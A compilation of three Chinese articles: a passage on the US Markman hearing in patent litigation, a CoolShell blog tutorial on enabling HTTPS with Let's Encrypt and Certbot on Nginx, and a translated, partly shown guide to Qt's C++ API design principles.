“马克曼听证”制度确立之前，在专利侵权诉讼中的权利要求书解释，通常交由陪审团在对案件事实进行裁决时一并做出，且并不会在诉讼文件上单独就陪审团这一问题的判断进行记录。1991年，马克曼（Markman）先生因认为其拥有的专利号为RE33054的“干洗衣物贮存及追踪控制装置”专利权被Westview公司所侵犯，遂向宾夕法尼亚州东区联邦地方法院提起了专利侵权诉讼。

该专利是用扫描的方式，将客户的衣物编号扫描后输入电脑中做分类标示，并在衣物干洗过程中追踪衣物位置，干洗完成后自动将衣物放回客户固定的存贮位置。被告的产品则是同时运用扫描器和电脑两种方式，将客户干洗衣物的资料存入电脑并显示费用、日期等相关信息。本案陪审团的裁决认为被告装置构成对原告专利权利的侵犯，但该地方法院认为系争专利与被告装置在功能实施上并不一致，遂推翻陪审团的裁决，判决被告不构成侵权。

马克曼不服，于1995年向联邦上诉法院提起上诉，但其上诉理由仅为联邦地方法院错误地解释了陪审团关于专利权利要求书解释中某个词语的涵义。联邦上诉法院在审理该案时，将案件的核心问题定为两个：一是原告对于请求项解释有无权利请求陪审团裁决;二是联邦地方法院是否正确地解释了“Inventory”一词。该院多数法官经审理后认为，权利要求书范围的解释与确定，属于法律问题而非事实问题，因而属于法院权限，而不应交由陪审团决定，且此前将此问题交由陪审团确定并不妥当。同时，由于认为原告专利与被告装置存在实质功能上的差异，联邦上诉法院亦不认为被告构成专利侵权。少数持不同意见的该院法官主要是质疑这一结论违反了美国第七宪法修正案（即所有根据美国法律进行的普通法诉讼，只要争议金额超过20美元，即有要求陪审团审判的权利）。

马克曼不服，向最高法院提出上诉。1996年4月23日，美国最高法院就马克曼诉Westview器械公司案（Markman v. Westview Instruments, Inc. 517 U.S. 370 （1996））做出终审裁决，裁决认定：权利要求书的解释是联邦地区法院法官应当处理的法律问题，而不是应当由陪审团来认定的事实问题，尽管在解释权利要求书的过程中可能会包含一些对于事实问题的解释，且这样做并不违反第七修正案赋予给陪审团的权利。这一裁决标志着“马克曼听证”制度的正式确立。

“马克曼听证”制度的不足

该案判决是美国专利诉讼史上的一个重大转折。“马克曼听证”成为法官专门用于解释专利权利要求的一个经常性听证程序，用以解决专利侵权诉讼的核心问题。由于该听证并非普遍适用，因此，十几年来，联邦民事诉讼规则并未正式对其有任何规定，而是给予法院绝对的自由裁量权。但是，何时可以进行“马克曼听证”?如何进行?是否有必要进行?类似问题在一定程度上困扰了审理专利侵权案件较多的法院。

2001年，加州北区联邦地区法院率先制定了供本法院使用的专利审判专属规则（Patent Local Rules），其中第四部分即为权利要求书的解释程序（Claim Construction Proceddings），对“马克曼听证”的时间、流程、限制及当事人的义务均进行了规定。此后，各州纷纷效仿。目前，乔治亚州北区联邦法院、得克萨斯州东区联邦法院、得克萨斯州南区联邦法院、宾夕法尼亚州西区联邦法院等都制订了书面的“马克曼听证”程序指南。近年来，不断有新的案例在解释与细化着“马克曼听证”，如2006年的Wilson Sporting Goods Co.诉Hillerich & Bradsby Co.案，2005年的Phillips诉AWH Corp.案，2008年的Howmedica Osteonics Corp.诉Wright Medical Technology, Inc.案，这些司法实践大大拓展与丰富了“马克曼听证”使用的实体和程序规则，使之日渐成为美国专利诉讼中一个复杂、完备的司法程序。以至于竟然有人开发了模拟“马克曼听证”程序，只要你愿意，可以下载并训练，以熟悉和确保有真正的权利要求书解释时不会出现不利于自己的问题。

但是，该听证带来的问题也逐渐受到重视。有人质疑说该程序导致专利诉讼费用增加，因为“马克曼听证”通常会单独进行，且程序复杂，因此导致当事人花费大量的时间与精力，更为重要的是，由于40%至60%的联邦地区法院案件会在联邦巡回上诉法院被推翻，因此，花费巨大的“马克曼听证”似乎价值有限。同时，权利要求书的解释要求是不多不少，忠实于技术发明思想与发明事实，但由于地区法院分散，法官的相关技术知识不十分专业，将权利要求书解释这样的问题交给他们，难免会带来一些无法克服的问题。

“马克曼听证”制度的启示

我国民事诉讼中并无陪审团制度，案件的事实问题与法律问题均由法官审理与确定。在专利侵权诉讼中，对于案件中涉及到的技术问题可以通过专家鉴定等方式解决，但并不因此免除法官审理案件的义务，即法律问题的判断归于法官，事实的法律属性判断仍然归于法官。同时，权利要求书的解释在我国的专利侵权诉讼中并不是一个单独的程序，而是合并在案件审理过程中。因此，仅就我国的司法审判而言，“马克曼听证”制度并无直接的借鉴意义。

但是，对于那些已经走出和正在走出国门的企业来说，了解与掌握这一重要的专利诉讼程序却是极其重要的。通领科技集团的积极尝试充分证明了这一点，而且随着这一程序的不断成熟，美国国际贸易法院（ITC）也开始在审理时适用“马克曼听证”制度。所以，知道“马克曼听证”意味着什么，确保所提交的用于解释权利要求的文件确实充分，学会利用“马克曼听证”，无论是对于破解美国的专利诉讼威胁，还是为未来准备有效的法律武器，无疑都非常重要。（知识产权报　作者　魏玮）

 

（全文完）

# 如何免费的让网站启用HTTPS

#####  [2017年08月26日 ](https://coolshell.cn/articles/18094.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [91 条评论](https://coolshell.cn/articles/18094.html#comments) 99,973 人阅读

![img](photo/enable-https-banner.png)今天，我把CoolShell变成https的安全访问了。我承认这件事有点晚了，因为之前的HTTP的问题也有网友告诉我，被国内的电信运营商在访问我的网站时加入了一些弹窗广告。另外，HTTP的网站在搜索引擎中的rank会更低。所以，这事早就应该干了。现在用HTTP访问CoolShell会被得到一个 301 的HTTPS的跳转。下面我分享一下启用HTTPS的过程。

我用的是 [Let’s Encrypt](https://letsencrypt.org/)这个免费的解决方案。Let’s Encrypt 是一个于2015年推出的数字证书认证机构，将通过旨在消除当前手动创建和安装证书的复杂过程的自动化流程，为安全网站提供免费的SSL/TLS证书。这是由[互联网安全研究小组](https://letsencrypt.org/isrg/)（ISRG – Internet Security Research Group，一个公益组织）提供的服务。主要赞助商包括[电子前哨基金会](https://www.eff.org/)，[Mozilla基金会](https://www.mozilla.org/foundation/)，[Akamai](https://www.akamai.com/)以及Cisco等公司（[赞助商列表](https://letsencrypt.org/sponsors/)）。

2015年6月，Let’s Encrypt得到了一个存储在硬件安全模块中的离线的RSA根证书。这个由IdenTrust证书签发机构交叉签名的根证书被用于签署两个证书。其中一个就是用于签发请求的证书，另一个则是保存在本地的证书，这个证书用于在上一个证书出问题时作备份证书之用。因为IdenTrust的CA根证书目前已被预置于主流浏览器中，所以Let’s Encrypt签发的证书可以从项目开始就被识别并接受，甚至当用户的浏览器中没有信任ISRG的根证书时也可以。



以上介绍文字来自 Wikipedia 的 [Let’s Encrypt 词条](https://zh.wikipedia.org/wiki/Let's_Encrypt)。

为你的网站来安装一个证书十分简单，只需要使用电子子前哨基金会EFF的 [Certbot](https://certbot.eff.org/)，就可以完成。

1）首先，打开 [https://certbot.eff.org](https://certbot.eff.org/) 网页。

2）在那个机器上图标下面，你需要选择一下你用的 Web 接入软件 和你的 操作系统。比如，我选的，`nginx` 和 `Ubuntu 14.04`

3）然后就会跳转到一个安装教程网页。你就照着做一遍就好了。

以Coolshell.cn为例 – Nginx + Ubuntu

首先先安装相应的环境：

```
$ sudo apt-get update
$ sudo apt-get install software-properties-common
$ sudo add-apt-repository ppa:certbot/certbot
$ sudo apt-get update
$ sudo apt-get install python-certbot-nginx
```

然后，运行如下命令：

```
$ sudo certbot --nginx
```

`certbot` 会自动检查到你的 `nginx.conf` 下的配置，把你所有的虚拟站点都列出来，然后让你选择需要开启 https 的站点。你就简单的输入列表编号（用空格分开），然后，certbot 就帮你下载证书并更新 `nginx.conf` 了。

你打开你的 `nginx.conf` 文件 ，你可以发现你的文件中的 `server` 配置中可能被做了如下的修改：

```
listen 443 ssl; # managed by Certbot
ssl_certificate /etc/letsencrypt/live/coolshell.cn/fullchain.pem; # managed by Certbot
ssl_certificate_key /etc/letsencrypt/live/coolshell.cn/privkey.pem; # managed by Certbot
include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
```

和

```
 # Redirect non-https traffic to https
if ($scheme != "https") {
  return 301 https://$host$request_uri;
} # managed by Certbot
```

 

这里建议配置 http2，这要求 Nginx 版本要大于 1.9.5。HTTP2 具有更快的 HTTPS 传输性能，非常值得开启（[关于性能你可以看一下这篇文章](http://blog.httpwatch.com/2015/01/16/a-simple-performance-comparison-of-https-spdy-and-http2/)）。需要开启HTTP/2其实很简单，只需要在 `nginx.conf` 的 `listen 443 ssl;` 后面加上 `http2` 就好了。如下所示：

```
listen 443 ssl http2; # managed by Certbot 
ssl_certificate /etc/letsencrypt/live/coolshell.cn/fullchain.pem; # managed by Certbot 
ssl_certificate_key /etc/letsencrypt/live/coolshell.cn/privkey.pem; # managed by Certbot 
include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
```

然后，就 `nginx -s reload` 就好了。

但是，**Let’s Encrypt 的证书90天就过期了**，所以，你还要设置上自动化的更新脚本，最容易的莫过于使用 `crontab` 了。使用 `crontab -e` 命令加入如下的定时作业（每个月都强制更新一下）：

```
0 0 1 * * /usr/bin/certbot renew --force-renewal
5 0 1 * * /usr/sbin/service nginx restart
```

当然，你也可以每天凌晨1点检查一下：

```
0 1 * * * certbot renew
```

注：crontab 中有六个字段，其含义如下：

- 第1个字段：分钟 (0-59)
- 第2个字段：小时 (0-23)
- 第3个字段：日期 (1-31)
- 第4个字段：月份 (1-12 [12 代表 December])
- 第5个字段：一周当中的某天 (0-7 [7 或 0 代表星期天])
- /path/to/command – 计划执行的脚本或命令的名称

**这么方便的同时，我不禁要问，如果是一些恶意的钓鱼网站也让自己的站点变成https的，这个对于一般用来说就有点难以防范了。哎……**

当然，在nginx或apache上启用HTTPS后，还没有结束。因为你可能还需要修改一下你的网站，不然你的网站在浏览时会出现各种问题。

**启用HTTPS后，你的网页中的所有的使用 `http://` 的方式的地方都要改成 `https://` 不然你的图片，js， css等非https的连接都会导致浏览器抱怨不安全而被block掉**。所以，你还需要修改你的网页中那些 hard code `http://` 的地方。

对于我这个使用wordpress的博客系统来说，有这么几个部分需要做修改。

1）首先是 wordpress的 常规设置中的 “**WordPress 地址**” 和 “**站点地址**” 需要变更为 https 的方式。

2）然后是文章内的图片等资源的链接需要变更为 https 的方式。对此，你可以使用一个叫 “[Search Regex](https://wordpress.org/plugins/search-regex/)” 插件来批量更新你历史文章里的图片或别的资源的链接。比如：把 `http://coolshell.cn` 替换成了 `https://coolshell.cn`

3）如果你像我一样启用了文章缓存（我用的是[WP-SuperCache](https://wordpress.org/plugins/wp-super-cache/)插件），你还要去设置一下 “**CDN**” 页面中的 “Site URL” 和 “off-site URL” 确保生成出来的静态网页内是用https做资源链接的。

基本上就是这些事。希望大家都来把自己的网站更新成 https 的。

嗯，12306，你什么时候按照这个教程做一下你的证书？

（全文完）

# API设计原则 – QT官网的设计实践总结

#####  [2017年07月25日 ](https://coolshell.cn/articles/18024.html) [李 鼎](https://coolshell.cn/articles/author/oldratlee) 评论 [26 条评论](https://coolshell.cn/articles/18024.html#comments) 78,955 人阅读

**（感谢好友 [@李鼎](http://www.weibo.com/oldratlee) 翻译此文）**

原文链接：[API Design Principles](http://qt-project.org/wiki/API-Design-Principles) – [Qt Wiki](http://wiki.qt.io/)
基于[Gary的影响力](http://blog.csdn.net/gaoyingju)上 *Gary Gao* 的译文稿：[C++的API设计指导](http://blog.csdn.net/gaoyingju/article/details/8245108)

## 译序

![img](photo/api-design-300x278.jpg)

Qt的设计水准在业界很有口碑，一致、易于掌握和强大的API是Qt最著名的优点之一。此文既是Qt官网上的API设计指导准则，也是Qt在API设计上的实践总结。虽然Qt用的是C++，但其中设计原则和思考是具有普适性的（如果你对C++还不精通，可以忽略与C++强相关或是过于细节的部分，仍然可以学习或梳理关于API设计最有价值的内容）。整个篇幅中有很多示例，是关于API设计一篇难得的好文章。

需要注意的是，这篇Wiki有一些内容并不完整，所以，可能会有一些阅读上的问题，我们对此做了一些相关的注释。

PS：翻译中肯定会有不足和不对之处，欢迎评论&交流；另译文源码在[GitHub的这个仓库](https://github.com/oldratlee/translations/tree/master/api-design-principles-from-qt)中，可以[提交Issue](https://github.com/oldratlee/translations/issues)/[Fork后提交代码](https://github.com/oldratlee/translations/fork)来建议/指正。

# API设计原则

一致、易于掌握和强大的API是Qt最著名的优点之一。此文总结了我们在设计Qt风格API的过程中所积累的诀窍（know-how）。其中许多是通用准则；而其他的则更偏向于约定，遵循这些约定主要是为了与已有的API保持一致。

虽然这些准则主要用于对外的API（public API），但在设计对内的API（private API）时也推荐遵循相同的技巧（techniques），作为开发者之间协作的礼仪（courtesy）。



如有兴趣也可以读一下 *Jasmin Blanchette* 的[Little Manual of API Design (PDF)](http://www4.in.tum.de/~blanchet/api-design.pdf) 或是本文的前身 *Matthias Ettrich* 的[Designing Qt-Style C++ APIs](https://doc.qt.io/archives/qq/qq13-apis.html)。

# 1. 好API的6个特质

API之于程序员就如同图形界面之于普通用户（end-user）。API中的『P』实际上指的是『程序员』（Programmer），而不是『程序』（Program），强调的是API是给程序员使用的这一事实。

在第13期[Qt季刊](http://doc.qt.io/archives/qq/)，*Matthias* 的[关于API设计的文章](https://doc.qt.io/archives/qq/qq13-apis.html)中提出了观点：API应该极简（minimal）且完备（complete）、语义清晰简单（have clear and simple semantics）、符合直觉（be intuitive）、易于记忆（be easy to memorize）和引导API使用者写出可读代码（lead to readable code）。

## 1.1 极简

极简的API是指每个class的public成员尽可能少，public的class也尽可能少。这样的API更易理解、记忆、调试和变更。

## 1.2 完备

完备的API是指期望有的功能都包含了。这点会和保持API极简有些冲突。如果一个成员函数放在错误的类中，那么这个函数的潜在用户就会找不到，这也是违反完备性的。

## 1.3 语义清晰简单

就像其他的设计一样，我们应该遵守最少意外原则（the principle of least surprise）。好的API应该可以让常见的事完成的更简单，并有可以完成不常见的事的可能性，但是却不会关注于那些不常见的事。解决的是具体问题；当没有需求时不要过度通用化解决方案。（举个例子，在Qt 3中，`QMimeSourceFactory`不应命名成`QImageLoader`并有不一样的API。）

## 1.4 符合直觉

就像计算机里的其他事物一样，API应该符合直觉。对于什么是符合直觉的什么不符合，不同经验和背景的人会有不同的看法。API符合直觉的测试方法：经验不很丰富的用户不用阅读API文档就能搞懂API，而且程序员不用了解API就能看明白使用API的代码。

## 1.5 易于记忆

为使API易于记忆，API的命名约定应该具有一致性和精确性。使用易于识别的模式和概念，并且避免用缩写。

## 1.6 引导API使用者写出可读代码

代码只写一次，却要多次的阅读（还有调试和修改）。写出可读性好的代码有时候要花费更多的时间，但对于产品的整个生命周期来说是节省了时间的。

最后，要记住的是，不同的用户会使用API的不同部分。尽管简单使用单个Qt类的实例应该符合直觉，但如果是要继承一个类，让用户事先看好文档是个合理的要求。

# 2. 静态多态

相似的类应该有相似的API。在继承（inheritance）合适时可以用继承达到这个效果，即运行时多态。然而多态也发生在设计阶段。例如，如果你用`QProgressBar`替换`QSlider`，或是用`QString`替换`QByteArray`，你会发现API的相似性使的替换很容易。这即是所谓的『静态多态』（static polymorphism）。

静态多态也使记忆API和编程模式更加容易。因此，一组相关的类有相似的API有时候比每个类都有各自的一套API更好。

一般来说，在Qt中，如果没有足够的理由要使用继承，我们更倾向于用静态多态。这样可以减少Qt public类的个数，也使刚学习Qt的用户在翻看文档时更有方向感。

## 2.1 好的案例

`QDialogButtonBox`与`QMessageBox`，在处理按钮（`addButton()`、`setStandardButtons()`等等）上有相似的API，不需要继承某个`QAbstractButtonBox`类。

## 2.2 差的案例

`QTcpSocket`与`QUdpSocket`都继承了`QAbstractSocket`，这两个类的交互行为的模式（mode of interaction）非常不同。似乎没有什么人以通用和有意义的方式用过`QAbstractSocket`指针（或者 ***能\*** 以通用和有意义的方式使用`QAbstractSocket`指针）。

## 2.3 值得斟酌的案例

`QBoxLayout`是`QHBoxLayout`与`QVBoxLayout`的父类。好处：可以在工具栏上使用`QBoxLayout`，调用`setOrientation()`使其变为水平/垂直。坏处：要多一个类，并且有可能导致用户写出这样没什么意义的代码，`((QBoxLayout *)hbox)->setOrientation(Qt::Vertical)`。

# 3. 基于属性的API

新的Qt类倾向于用『基于属性（property）的API』，例如：

[code language=”cpp”]
QTimer timer;
timer.setInterval(1000);
timer.setSingleShot(true);
timer.start();
[/code]

这里的 ***属性\*** 是指任何的概念特征（conceptual attribute），是对象状态的一部分 —— 无论它是不是`Q_PROPERTY`。在说得通的情况下，用户应该可以以任何顺序设置属性，也就是说，属性之间应该是正交的（orthogonal）。例如，上面的代码可以写成：

[code language=”cpp”]
QTimer timer;
timer.setSingleShot(true);
timer.setInterval(1000);
timer.start();
[/code]

> 【译注】：正交性是指改变某个特性而不会影响到其他的特性。[《程序员修炼之道》](https://book.douban.com/subject/5387402/)中讲了关于正交性的一个直升飞机坠毁的例子，讲得深入浅出很有画面感。

为了方便，也写成：

[code language=”cpp”]
timer.start(1000)；
[/code]

类似地，对于`QRegExp`会是这样的代码：

[code language=”cpp”]
QRegExp regExp;
regExp.setCaseSensitive(Qt::CaseInsensitive);
regExp.setPattern(".");
regExp.setPatternSyntax(Qt::WildcardSyntax);
[/code]

为实现这种类型的API，需要借助底层对象的懒创建。例如，对于`QRegExp`的例子，在不知道模式语法（pattern syntax）的情况下，在`setPattern()`中去解释`"."`就为时过早了。

属性之间常常有关联的；在这种情况下，我们必须小心处理。思考下面的问题：当前的风格（style）提供了『默认的图标尺寸』属性 vs. `QToolButton`的『`iconSize`』属性：

[code language=”cpp”]
toolButton->setStyle(otherStyle);
toolButton->iconSize(); // returns the default for otherStyle
toolButton->setIconSize(QSize(52, 52));
toolButton->iconSize(); // returns (52, 52)
toolButton->setStyle(yetAnotherStyle);
toolButton->iconSize(); // returns (52, 52)
[/code]

提醒一下，一旦设置了`iconSize`，设置就会一直保持，即使改变当前的风格。这 ***很好\***。但有的时候需要能重置属性。有两种方法：

1. 传入一个特殊值（如`QSize()`、`-1`或者`Qt::Alignment(0)`）来表示『重置』
2. 提供一个明确的重置方法，如`resetFoo()`和`unsetFoo()`

对于`iconSize`，使用`QSize()`（比如 `QSize(–1, -1)`）来表示『重置』就够用了。

在某些情况下，getter方法返回的结果与所设置的值不同。例如，虽然调用了`widget->setEnabled(true)`，但如果它的父widget处于disabled状态，那么`widget->isEnabled()`仍然返回的是`false`。这样是OK的，因为一般来说就是我们想要的检查结果（父widget处于disabled状态，里面的子widget也应该变为灰的不响应用户操作，就好像子widget自身处于disabled状态一样；与此同时，因为子widget记得在自己的内心深处是enabled状态的，只是一直等待着它的父widget变为enabled）。当然诸如这些都必须在文档中妥善地说明清楚。

# 4. C++相关

## 4.1 值 vs. 对象

### 4.1.1 指针 vs. 引用

指针（pointer）还是引用（reference）哪个是最好的输出参数（out-parameters）？

[code language=”cpp”]
void getHsv(int *h, int *s, int *v) const;
void getHsv(int &h, int &s, int &v) const;
[/code]

大多数C++书籍推荐尽可能使用引用，基于一个普遍的观点：引用比指针『更加安全和优雅』。与此相反，我们在开发Qt时倾向于指针，因为指针让用户代码可读性更好。比较下面例子：

[code language=”cpp”]
color.getHsv(&h, &s, &v);
color.getHsv(h, s, v);
[/code]

只有第一行代码清楚表达出`h`、`s`、`v`参数在函数调用中非常有可能会被修改。

这也就是说，编译器并不喜欢『出参』，所你应该在新的API中避免使用『出参』，而是返回一个结构体，如下所示：

[code language=”cpp”]
struct Hsv { int hue, saturation, value };
Hsv getHsv() const;
[/code]

> 【译注】：函数的『入参』和『出参』的混用会导致 API 接口语义的混乱，所以，使用指针，在调用的时候，实参需要加上“&”，这样在代码阅读的时候，可以看到是一个『出参』，有利于代码阅读。（但是这样做，在函数内就需要判断指针是否为空的情况，因为引用是不需要判断的，所以，这是一种 trade-off）
>
> 另外，如果这样的参数过多的话，最好使用一个结构体来把数据打包，一方面，为一组返回值取个名字，另一方面，这样有利用接口的简单。

### 4.1.2 按常量引用传参 vs. 按值传参

如果类型大于16字节，按常量引用传参。

如果类型有重型的（non-trivial）拷贝构造函数（copy-constructor）或是重型的析构函数（destructor），按常量引用传参以避免执行这些函数。

对于其它的类型通常应该按值传参。

示例：

[code language=”cpp”]
void setAge(int age);
void setCategory(QChar cat);
void setName(QLatin1String name);

// const-ref is much faster than running copy-constructor and destructor
void setAlarm(const QSharedPointer<Alarm> &alarm);

// QDate, QTime, QPoint, QPointF, QSize, QSizeF, QRect
// are good examples of other classes you should pass by value.
[/code]

> 【译注】：这是传引用和传值的差别了，因为传值会有对像拷贝，传引用则不会。所以，如果对像的构造比较重的话（换句话说，就是对像里的成员变量需要的内存比较大），这就会影响很多性能。所以，为了提高性能，最好是传引用。但是如果传入引用的话，会导致这个对象可能会被改变。所以传入const reference。

## 4.2 虚函数

在C++中，当类的成员函数声明为virtual，主要是为了通过在子类重载此函数能够定制函数的行为。将函数声明为virtual的目的是为了让对这个函数已有的调用变成执行实际实例的代码路径。对于没有在类外部调用的函数声明成virtual，你应该事先非常慎重地思考过。

[code language=”cpp”]
// QTextEdit in Qt 3: member functions that have no reason for being virtual
virtual void resetFormat();
virtual void setUndoDepth( int d );
virtual void setFormat( QTextFormat *f, int flags );
virtual void ensureCursorVisible();
virtual void placeCursor( const QPoint &pos;, QTextCursor **c = 0 );
virtual void moveCursor( CursorAction action, bool select );
virtual void doKeyboardAction( KeyboardAction action );
virtual void removeSelectedText( int selNum = 0 );
virtual void removeSelection( int selNum = 0 );
virtual void setCurrentFont( const QFont &f );
virtual void setOverwriteMode( bool b ) { overWrite = b; }
[/code]

`QTextEdit`从Qt 3移植到Qt 4的时候，几乎所有的虚函数都被移除了。有趣的是（但在预料之中），并没有人对此有大的抱怨，为什么？因为Qt 3没用到`QTextEdit`的多态行为 —— 只有你会；简单地说，没有理由去继承`QTextEdit`并重写这些函数，除非你自己调用了这些方法。如果在Qt在外部你的应用程序你需要多态，你可以自己添加多态。

> 【译注】：『多态』的目的只不过是为了实践 —— 『依赖于接口而不是实现』，也就是说，接口是代码抽像的一个非常重要的方式（在Java/Go中都有专门的接口声明语法）。所以，如果没有接口抽像，使用『多态』的意义也就不大了，因为也就没有必要使用『虚函数』了。

### 4.2.1 避免虚函数

在Qt中，我们有很多理由尽量减少虚函数的数量。每一次对虚函数的调用会在函数调用链路中插入一个未掌控的节点（某种程度上使结果更无法预测），使得bug修复变得更复杂。用户在重写的虚函数中可以做很多疯狂的事：

- 发送事件
- 发送信号
- 重新进入事件循环（例如，通过打开一个模态文件对话框）
- 删除对象（即触发『`delete this`』）

还有其他很多原因要避免过度使用虚函数：

- 添加、移动或是删除虚函数都带来二进制兼容问题（binary compatibility/BC）
- 重载虚函数并不容易
- 编译器几乎不能优化或内联（inline）对虚函数的调用
- 虚函数调用需要查找虚函数表（v-table），这比普通函数调用慢了2到3倍
- 虚函数使得类很难按值拷贝（尽管也可以按值拷贝，但是非常混乱并且不建议这样做）

经验告诉我们，没有虚函数的类一般bug更少、维护成本也更低。

一般的经验法则是，除非我们以这个类作为工具集提供而且有很多用户来调用某个类的虚函数，否则这个函数九成不应该设计成虚函数。

> 【译注】：
>
> 1. 使用虚函数时，你需要对编译器的内部行为非常清楚，否则，你会在使用虚函数时，觉得有好些『古怪』的问题发生。比如在创建数组对象的时候。
> 2. 在C++中，会有一个基础类，这个基础类中已经实现好了很多功能，然后把其中的一些函数放给子类去修改和实现。这种方法在父类和子类都是一组开发人员维护时没有什么问题，但是如果这是两组开发人员，这就会带来很多问题了，就像Qt这样，子类完全无法控制，全世界的开发人员想干什么就干什么。所以，子类的代码和父类的代码在兼容上就会出现很多很多问题。所以，还是上面所说，其实，虚函数应该声明在接口的语义里（这就是设计模式的两个宗旨——依赖于接口，而不是实现；钟爱于组合，而不是继承。也是为什么Java和Go语言使用interface关键字的原因，C++在多态的语义上非常容易滥用）

### 4.2.2 虚函数 vs. 拷贝

多态对象（polymorphic objects）和值类型的类（value-type classes）两者很难协作好。

包含虚函数的类必须把析构函数声明为虚函数，以防止父类析构时没有清理子类的数据，导致内存泄漏。

如果要使一个类能够拷贝、赋值或按值比较，往往需要拷贝构造函数、赋值操作符（`operator =`）和相等操作符（`operator ==`）。

[code language=”cpp”]
class CopyClass {
public:
CopyClass();
CopyClass(const CopyClass &other);
~CopyClass();
CopyClass &operator =(const CopyClass &other);
bool operator ==(const CopyClass &other) const;
bool operator !=(const CopyClass &other) const;

virtual void setValue(int v);
};
[/code]

如果继承`CopyClass`这个类，预料之外的事就已经在代码时酝酿了。一般情况下，如果没有虚成员函数和虚析构函数，就不能创建出可以多态的子类。然而，如果存在虚成员函数和虚析构函数，这突然变成了要有子类去继承的理由，而且开始变得复杂了。***起初认为只要简单声明上虚操作符重载函数（virtual operators）。\*** 但其实是走上了一条混乱和毁灭之路（破坏了代码的可读性）。看看下面的这个例子：

[code language=”cpp”]
class OtherClass {
public:
const CopyClass &instance() const; // 这个方法返回的是什么？可以赋值什么？
};
[/code]

（这部份还未完成）

> 【译注】：因为原文上说，这部份并没有完成，所以，我也没有搞懂原文具体也是想表达什么。不过，就标题而言，原文是想说，在多态的情况下拷贝对象所带来的问题？？

## 4.3 关于const

***C++的关键词const表明了内容不会改变或是没有副作用。可以应用于简单的值、指针及指针所指的内容，也可以作为一个特别的属性应用于类的成员函数上，表示成员函数不能修改对象的状态。\***

然而，const本身并没有提供太大的价值 —— 很多编程语言甚至没有类似const的关键词，但是却并没有因此产生问题。实际上，如果你不用函数重载，并在C++源代码用搜索并删除所有的const，几乎总能编译通过并且正常运行。尽量让使用的const保持实用有效，这点很重要。

让我们看一下在Qt的API设计中与const相关的场景。

### 4.3.1 输入参数：const指针

有输入指针参数的const成员函数，几乎总是const指针参数。

如果函数声明为const，意味着既没有副作用，也不会改变对象的可见状态。那为什么它需要一个没有const限定的输入参数呢？记住const类型的函数通常被其他const类型的函数调用，接收到的一般都是const指针（只要不主动const_cast，我们推荐尽量避免使用const_cast）

以前：

[code language=”cpp”]
bool QWidget::isVisibleTo(QWidget *ancestor) const;
bool QWidget::isEnabledTo(QWidget *ancestor) const;
QPoint QWidget::mapFrom(QWidget *ancestor, const QPoint &pos) const;
[/code]

`QWidget`声明了许多非const指针输入参数的const成员函数。注意，这些函数可以修改传入的参数，不能修改对象自己。使用这样的函数常常要借助const_cast转换。如果是const指针输入参数，就可以避免这样的转换了。

之后：

[code language=”cpp”]
bool QWidget::isVisibleTo(const QWidget *ancestor) const;
bool QWidget::isEnabledTo(const QWidget *ancestor) const;
QPoint QWidget::mapFrom(const QWidget *ancestor, const QPoint &pos) const;
[/code]

注意，我们在`QGraphicsItem`中对此做了修正，但是`QWidget`要等到Qt 5:

[code language=”cpp”]
bool isVisibleTo(const QGraphicsItem *parent) const;
QPointF mapFromItem (const QGraphicsItem *item, const QPointF &point) const;
[/code]

### 4.3.2 返回值：const值

调用函数返回的非引用类型的结果，称之为右值（R-value）。

非类（non-class）的右值总是无cv限定类型（cv-unqualified type）。虽然从语法上讲，加上const也可以，但是没什么意义，因为鉴于访问权限这些值是不能改变的。多数现代编译器在编译这样的代码时会提示警告信息。

> 【译注】：cv-qualified的类型（与cv-unqualified相反）是由const或者volatile或者volatile const限定的类型。详见[cv (const and volatile) type qualifiers – C++语言参考](http://en.cppreference.com/w/cpp/language/cv)

当在类类型（class type）右值上添加const关键字，则禁止访问非const成员函数以及对成员的直接操作。

不加const则没有以上的限制，但几乎没有必要加上const，因为右值对象生存时间（life time）的结束一般在C++清理的时候（通俗的说，下一个分号地方），而对右值对象的修改随着右值对象的生存时间也一起结束了（也就是本条语句的执行完成的时候）。

示例：

[code language=”cpp”]
struct Foo {
void setValue(int v) { value = v; }
int value;
};

Foo foo() {
return Foo();
}

const Foo cfoo() {
return Foo();
}

int main() {
// The following does compile, foo() is non-const R-value which
// can’t be assigned to (this generally requires an L-value)
// but member access leads to a L-value:
foo().value = 1; // Ok, but temporary will be thrown away at the end of the full-expression.

// The following does compile, foo() is non-const R-value which
// can’t be assigned to, but calling (even non-const) member
// function is fine:
foo().setValue(1); // Ok, but temporary will be thrown away at the end of the full-expression.

// The following does _not_compile, foo() is ”const” R-value
// with const member which member access can’t be assigned to:
cfoo().value = 1; // Not ok.

// The following does _not_compile, foo() is ”const” R-value,
// one cannot call non-const member functions:
cfoo().setValue(1); // Not ok
}
[/code]

> 【译注】：上述的代码说明，如果返回值不是const的，代码可以顺利编译通过，然而并没有什么卵用，因为那个临时对像马上就被抛弃了。所以，这样的无用的代码最好还是在编译时报个错，以免当时头脑发热想错了，写了一段没用但还以为有用的代码。

### 4.3.3 返回值：非const的指针还是有const的指针

谈到const函数应该返回非const的指针还是const指针这个话题时，多数人发现在C++中关于『const正确性』（const correctness）在概念上产生了分歧。 *问题起源是：**const函数本身不能修改对象自身的状态，却可以返回成员的非const指针**。返回指针这个简单动作本身既不会影响整个对象的可见状态，当然也不会改变这个函数职责范围内涉及的状态。但是，这却使得程序员可以间接访问并修改对象的状态。*

下面的例子演示了通过返回非const指针的const函数绕开const约定（constness）的诸多方式中的一种：

[code language=”cpp”]
QVariant CustomWidget::inputMethodQuery(Qt::InputMethodQuery query) const {
moveBy(10, 10); // doesn’t compile!
window()->childAt(mapTo(window(), rect().center()))->moveBy(10, 10); // compiles!
}
[/code]

返回const指针的函数正是保护以避免这些（可能是不期望的/没有预料到的）副作用，至少是在一定程度上。但哪个函数你会觉得更想返回const指针，或是不止一个函数？

若采用const正确（const-correct）的方法，每个返回某个成员的指针（或多个指向成员的指针）的const函数必须返回const指针。在实践中，很不幸这样的做法将导致无法使用的API：

[code language=”cpp”]
QGraphicsScene scene;
// … populate scene

foreach (const QGraphicsItem *item, scene.items()) {
item->setPos(qrand() % 500, qrand() % 500); // doesn’t compile! item is a const pointer
}
[/code]

`QGraphicsScene::items()`是一个const函数，顺着思考看起来这个函数只应该返回const指针。

在Qt中，我们几乎只有非const的使用模式。我们选择的是实用路子： 相比滥用非const指针返回类型带来的问题，返回const指针更可能招致过分使用const_cast的问题。

